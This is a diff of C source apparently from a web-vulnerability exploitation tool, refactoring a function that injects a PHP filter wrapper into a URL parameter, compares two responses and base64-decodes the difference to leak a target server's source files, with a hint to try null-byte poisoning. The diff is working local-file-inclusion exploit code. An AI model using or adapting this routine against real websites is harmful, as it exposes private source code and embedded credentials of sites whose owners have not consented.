@@ -410,26 +410,25 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
     return 0;
 }
 
-void source_disclosure_get(const char *uri, const char *filename, const char *p_name, FILE *out_file){
-    char *b64=NULL,*b64_dec=NULL;
-    char *xuri=NULL,*disc_xpl=NULL;
-    char *base_uri=NULL;
+void source_disclosure_get(const char *url, const char *filename, const char *pname, FILE *out){
     struct request body1, body2;
     struct parameter_list plist = {0};
-    size_t inject_index = 0;
+    char *base, *url_filter, *filter, *content_diff, *b64;
+    size_t pos = 0;
 
-    if(!get_element_pos(&plist, &base_uri, uri, p_name, &inject_index)){
-        printf("[-] Parameter: %s not found !!!\n",p_name);
+    if(!get_element_pos(&plist, &base, url, pname, &pos)){
+        error_single("parameter %s not found !!!\n", pname);
         return;
     }
 
-    disc_xpl = strcpy( xmalloc(strlen(filename)+strlen(FILTER_WRAP)+1), FILTER_WRAP);
-    strcat(disc_xpl, filename);
+    filter = xmalloc(strlen(filename)+sizeof(FILTER_WRAP));
+    memcpy(filter, FILTER_WRAP, sizeof(FILTER_WRAP));
+    strcat(filter, filename);
 
-    xuri = build_url(base_uri, &plist, inject_index, disc_xpl, replace_string);
+    url_filter = build_url(base, &plist, pos, filter, replace_string);
 
-    xfree(disc_xpl);
-    xfree(base_uri);
+    free(filter);
+    free(base);
 
     free(plist.trash);
     free(plist.parameter);
@@ -440,45 +439,47 @@ void source_disclosure_get(const char *uri, const char *filename, const char *p_
     init_str(&body1);
     init_str(&body2);
 
-    curl_easy_setopt(ch1, CURLOPT_URL, uri);
-    curl_easy_setopt(ch2, CURLOPT_URL, xuri);
-    xfree(xuri);
+    curl_easy_setopt(ch1, CURLOPT_URL, url);
+    curl_easy_setopt(ch2, CURLOPT_URL, url_filter);
+    free(url_filter);
 
-    printf("\n[+] Trying get source code of file: %s\n", filename);
+    info_single("trying get source code of file: %s\n", filename);
 
     if(!HttpRequest(ch1) || !HttpRequest(ch2))
         goto end;
 
-    b64 = diff(body1.ptr, body2.ptr);
+    content_diff = diff(body1.ptr, body2.ptr);
 
-    if(!b64)
+    if(!content_diff){
+        error_single("cannot detect base64 output\n");
         goto end;
-
-    trim_string(&b64);
-
-    if(b64decode(b64, &b64_dec)){
-        printf("[+] Possible source code returned\n");
-        if(out_file){
-            fprintf(out_file, "%s", b64_dec);
-            fclose(out_file);
-            printf("[+] Checkup file\n");
-        } else {
-            printf("%s", b64_dec);
-        }
-        printf("\n");
-        xfree(b64_dec);
-    } else {
-        printf("[-] no source code returned\n");
-        printf("[*] try use null byte poison, or not put filename with file extension\n");
     }
 
-    xfree(b64);
+    trim_string(&content_diff);
+
+    if(b64decode(content_diff, &b64)){
+        good_single("valid base64 returned:\n");
+        if(out){
+            fprintf(out, "%s", b64);
+            fclose(out);
+            info_single("check the output file\n");
+        } else {
+            printf("%s\n", b64);
+        }
+        printf("\n");
+        free(b64);
+    } else {
+        error_single("invalid base64 detected\n");
+        info_single("try use null byte poison, or set filename without extension\n");
+    }
+
+    free(content_diff);
 
     end:
     curl_easy_cleanup(ch1);
     curl_easy_cleanup(ch2);
-    xfree(body1.ptr);
-    xfree(body2.ptr);
+    free(body1.ptr);
+    free(body2.ptr);
 }
 
 int check_files(char *base, struct parameter_list *plist, int p){
